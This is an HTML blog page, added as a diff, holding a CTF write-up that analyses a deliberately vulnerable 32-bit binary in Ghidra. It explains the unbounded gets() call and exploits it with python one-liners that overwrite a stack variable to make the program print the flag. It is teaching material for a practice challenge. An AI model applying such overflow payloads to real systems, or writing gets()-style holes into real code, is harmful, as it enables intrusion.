@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+   <meta name="description" content="Today we are going to test out Ghidra with one of my university pwnie challenge.
+Info Value Name pwn1 Type ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0 Entropy 3.82492 (not packed) Analyzing Let&rsquo;s load the binary into our disassembler Ghidra and analyze the main function. Take your time to spot the problem in the following code.
+undefined4 main(void) { __uid_t __euid; __uid_t __ruid; char local_4c [40]; int local_24; undefined *local_14; local_14 = &amp;stack0x00000004; local_24 = 0; setbuf(stdout,(char *)0x0); setbuf(stdin,(char *)0x0); setbuf(stderr,(char *)0x0); puts(&#34;This should be an easy BOF!">  
+
+  <title>
+    
+      KCSC: A simple BOF
+    
+  </title>
+
+  
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon/green.png" />
+
+  
+  
+  
+  <link rel="stylesheet" href="//localhost:1313/css/main.f3fa33b7405523e26c3513ae28d727c60efcaaa6c532b418812d08f71cb380419ee24a4e53a155d97b0879f61144b0476768c589c47485ffa080cbc5a4cd85f2.css" integrity="sha512-8/ozt0BVI&#43;JsNROuKNcnxg78qqbFMrQYgS0I9xyzgEGe4kpOU6FV2XsIefYRRLBHZ2jFicR0hf&#43;ggMvFpM2F8g==" />
+  
+
+  
+  <script defer type="text/javascript" src="//localhost:1313/js/jquery_3.7.1.min.js"></script>
+  
+  
+  
+  <script defer type="text/javascript" src="//localhost:1313/js/typing_effect.min.js"></script>
+
+  
+  
+  <script defer type="text/javascript" src="//localhost:1313/js/img_relocs.min.js"></script>
+</head>
+<body a="dark">
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+<a style="color: #ff5;" href="/">[HOME]</a>
+
+<article>
+    <p class="post-meta">
+        
+        <time datetime="2021-03-28 09:30:00 &#43;1345 &#43;1345">
+            2021-03-28
+        </time>
+    </p>
+
+    <h1>KCSC: A simple BOF</h1>
+
+    
+        <aside >
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#analyzing">Analyzing</a></li>
+    <li><a href="#breakdown">Breakdown</a></li>
+  </ul>
+</nav>
+        </aside>
+    
+
+    <p>Today we are going to test out Ghidra with one of my university pwnie challenge.</p>
+<table>
+<thead>
+<tr>
+<th>Info</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Name</td>
+<td>pwn1</td>
+</tr>
+<tr>
+<td>Type</td>
+<td>ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0</td>
+</tr>
+<tr>
+<td>Entropy</td>
+<td>3.82492 (not packed)</td>
+</tr>
+</tbody>
+</table>
+<h2 id="analyzing"><a class="h-anchor" href="#analyzing">Analyzing</a></h2>
+<p>Let&rsquo;s load the binary into our disassembler Ghidra and analyze the main function. Take your time to spot the problem in the following code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined4 <span style="color:#ff0">main</span>(<span style="color:#ee82ee">void</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  __uid_t __euid;
+</span></span><span style="display:flex;"><span>  __uid_t __ruid;
+</span></span><span style="display:flex;"><span>  <span style="color:#ee82ee">char</span> local_4c [<span style="color:#f60">40</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#ee82ee">int</span> local_24;
+</span></span><span style="display:flex;"><span>  undefined *local_14;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  local_14 = &amp;stack0x00000004;
+</span></span><span style="display:flex;"><span>  local_24 = <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff0">setbuf</span>(stdout,(<span style="color:#ee82ee">char</span> *)<span style="color:#f60">0x0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff0">setbuf</span>(stdin,(<span style="color:#ee82ee">char</span> *)<span style="color:#f60">0x0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff0">setbuf</span>(stderr,(<span style="color:#ee82ee">char</span> *)<span style="color:#f60">0x0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff0">puts</span>(<span style="color:#87ceeb">&#34;This should be an easy BOF!&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff0">gets</span>(local_4c);
+</span></span><span style="display:flex;"><span>  <span style="color:#f00">if</span> (local_24 == <span style="color:#f60">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">puts</span>(<span style="color:#87ceeb">&#34;try again ma boi :v&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#f00">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">puts</span>(<span style="color:#87ceeb">&#34;Good, now try harder&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">if</span> (local_24 == <span style="color:#f60">0xbabebeef</span>) {
+</span></span><span style="display:flex;"><span>      __euid = <span style="color:#ff0">geteuid</span>();
+</span></span><span style="display:flex;"><span>      __ruid = <span style="color:#ff0">geteuid</span>();
+</span></span><span style="display:flex;"><span>      <span style="color:#ff0">setreuid</span>(__ruid,__euid);
+</span></span><span style="display:flex;"><span>      <span style="color:#ff0">puts</span>(<span style="color:#87ceeb">&#34;OK, submit the flag&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#ff0">system</span>(<span style="color:#87ceeb">&#34;cat flag&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#f00">return</span> <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="breakdown"><a class="h-anchor" href="#breakdown">Breakdown</a></h2>
+<p>We can see the variable <code>local_24</code> is declared but never changed and thus the program&rsquo;s flow will always result into <code>if (local_24 == 0)</code> statement, <em>right?</em> That&rsquo;s when the buffer overflow jumps in as the <code>gets</code> is marked as deprecated and not safe to use.</p>
+<blockquote>
+<p>MSDN:</p>
+<p>Because there is no way to limit the number of characters read by gets, untrusted input can easily cause buffer overruns. Use <code>fgets</code> instead.</p>
+</blockquote>
+<p>As the explanation is said, that it&rsquo;s impossible to tell how many characters <code>gets</code> will read into the buffer, here is <code>local_4c</code> with the length of 40 in character. Let&rsquo;s try overflow it with a simple python script.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──(kali㉿kali)-[~/CTF/KCSC/ez_bof]
+</span></span><span style="display:flex;"><span>└─$ python3 -c <span style="color:#87ceeb">&#34;print(&#39;a&#39;*41)&#34;</span> | ./pwn1
+</span></span><span style="display:flex;"><span>This should be an easy BOF!
+</span></span><span style="display:flex;"><span>Good, now try harder
+</span></span></code></pre></div><p>Great, we are able to get through the first block. In the next conditional statement, we can achieve the flag whether the comparison between <code>local_24</code> and <code>0xbabebeef</code> is equal. We can just simply modify the <code>local_24</code> value to <code>0xbabebeef</code>.</p>
+<p>As we have known that the buffer is holding 40 characters in size, the leftover ones are being passed onto the next stack address which is now <code>local_24</code>&rsquo;s address. So we will fill the buffer <code>local_4c</code> with 40 characters and then put <code>0xbabebeef</code> value into <code>local_24</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──(kali㉿kali)-[~/CTF/KCSC/ez_bof]
+</span></span><span style="display:flex;"><span>└─$ python3 -c <span style="color:#87ceeb">&#34;print(&#39;a&#39;*40 + &#39;\xef\xbe\xbe\xba&#39;)&#34;</span> | ./pwn1
+</span></span><span style="display:flex;"><span>This should be an easy BOF!
+</span></span><span style="display:flex;"><span>Good, now try harder
+</span></span><span style="display:flex;"><span>OK, submit the flag
+</span></span><span style="display:flex;"><span>KCSC{[REDACTED]}
+</span></span></code></pre></div>
+</article>
+
+            </div>
+        </main>
+    </body></html>
